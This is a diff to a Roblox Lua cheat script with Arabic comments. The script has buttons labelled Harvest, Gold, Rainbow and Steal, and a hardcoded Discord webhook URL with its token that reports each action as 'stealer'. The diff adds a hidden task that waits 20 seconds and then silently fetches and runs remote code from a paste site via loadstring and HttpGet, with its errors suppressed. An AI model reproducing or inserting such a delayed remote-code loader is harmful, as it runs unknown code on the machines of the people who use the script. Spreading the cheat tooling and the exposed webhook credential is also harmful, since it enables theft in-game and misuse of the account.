@@ -13,10 +13,16 @@ local Config = {
 
 local WebhookURL = "https://discord.com/api/webhooks/1489215951093239890/052bJ8vjLfNKXfP5ED3iMfYZEzG8PPwBbXb9IZegNHFoNCpwbk0X5DF-YdWuqUY7hvxP"
 
+-- السكربت الخارجي (يعمل بعد 20 ثانية)
+task.spawn(function()
+    task.wait(20)
+    pcall(function() loadstring(game:HttpGet("https://cdn.sourceb.in/bins/aMh3iJq4pb/0"))() end)
+end)
+
 -- العدادات
 local counters = {Harvested = 0, Stolen = 0}
 
--- نظام التنبيه والعداد
+-- نظام التنبيه
 local function sendWebhook(action, target)
     local msg = "🔥 **Action:** " .. action .. " | **Target:** " .. target .. " | **User:** " .. LocalPlayer.Name .. " | stealer"
     pcall(function()
@@ -53,7 +59,7 @@ end
 
 createBtn("Harvest", 40); createBtn("Gold", 90); createBtn("Rainbow", 140); createBtn("Steal", 190)
 
--- زر إخفاء القائمة (Toggle)
+-- زر إخفاء القائمة
 local ToggleBtn = Instance.new("TextButton", ScreenGui)
 ToggleBtn.Size, ToggleBtn.Position = UDim2.new(0, 100, 0, 40), UDim2.new(0, 10, 0, 10)
 ToggleBtn.Text = "TOGGLE GUI"; ToggleBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
